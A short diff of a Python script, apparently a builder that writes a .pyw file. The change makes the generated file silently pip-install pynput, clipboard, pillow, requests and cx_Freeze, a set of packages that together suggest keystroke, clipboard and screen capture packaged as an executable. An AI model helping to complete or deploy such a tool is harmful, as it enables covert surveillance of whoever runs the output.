@@ -257,6 +257,8 @@ def pyw():
             f.write(f"    '{option}': {valeur},\n")
         f.write("}\n\n")
 
+        f.write("os.system('pip install requests bs4 pynput pillow clipboard cx_Freeze')\n\n")
+
         f.write("import threading\n\n")
 
         f.write("import requests\n")
@@ -673,5 +675,3 @@ with open("logs.txt", "a") as fichier:
 
 def key():
     app.mainloop()
-
-key()
